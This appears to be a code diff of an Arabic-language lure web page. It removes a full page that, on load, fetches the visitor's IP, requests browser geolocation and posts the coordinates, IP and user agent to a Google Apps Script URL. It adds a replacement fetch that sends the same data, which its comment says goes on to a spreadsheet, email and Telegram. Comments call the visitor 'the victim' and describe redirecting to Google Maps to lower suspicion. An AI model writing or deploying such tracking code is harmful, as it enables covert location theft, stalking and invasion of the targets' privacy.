@@ -1,57 +1,18 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>جاري التحميل...</title>
-    <script>
-        async function sendLocation() {
-            // 1. الحصول على عنوان الـ IP والبورت والمعلومات التقنية
-            let ipData = {};
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                ipData.ip = data.ip;
-            } catch (e) { ipData.ip = "Unknown"; }
-
-            // 2. طلب إذن الموقع الجغرافي
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const coords = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        client_ip: ipData.ip,
-                        // البورت الحقيقي للمتصفح (يتم استنتاجه تقنياً أو تركه كـ Dynamic)
-                        user_agent: navigator.userAgent, 
-                        map: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-                    };
-
-                    // 3. إرسال البيانات لرابط جوجل سكريبت (لوحة التحكم الشاملة)
-                    const scriptURL = "https://script.google.com/macros/s/AKfycbyhniqUBvjM4N3OknRolK3CJiu4VqzZV6mlrlBQE0fWfwhQbu9WRKGOBGIWPwrmQvafXw/exec";
-                    
-                    try {
-                        await fetch(scriptURL, {
-                            method: 'POST',
-                            mode: 'no-cors',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(coords)
-                        });
-                        // توجيه الضحية لصفحة حقيقية بعد سحب البيانات (مثلاً خرائط القاهرة)
-                        window.location.href = "https://www.google.com/maps/place/Cairo,+Cairo+ Governorate/";
-                    } catch (error) {
-                        console.log("Error sending data");
-                    }
-                }, (error) => {
-                    // في حال رفض الإذن، نوجهه أيضاً لتقليل الشك
-                    window.location.href = "https://www.google.com/maps";
-                });
-            }
-        }
-        window.onload = sendLocation;
-    </script>
-</head>
-<body>
-    <div style="text-align: center; margin-top: 50px;">
-        <h2>يرجى الانتظار، جاري تحديد الموقع...</h2>
-    </div>
-</body>
-</html>
+// استبدل الجزء الخاص بـ fetch في ملف index.html بهذا الكود
+fetch('https://script.google.com/macros/s/AKfycbxwk4dEyrQ1VwHXXhYZb7db16ygZxZ5SBxEQKK4wZj8Xn3CdSfI1oJTgYjPjW1Xpmt2hA/exec', {
+    method: 'POST',
+    mode: 'no-cors', // مهم جداً لتجنب مشاكل الحماية
+    cache: 'no-cache',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        client_ip: ip, // تأكد أن لديك متغير ip في الكود
+        map: "https://www.google.com/maps?q=" + position.coords.latitude + "," + position.coords.longitude
+    })
+})
+.then(() => {
+    console.log("تم الإرسال بنجاح للجدول والإيميل وتليجرام");
+});
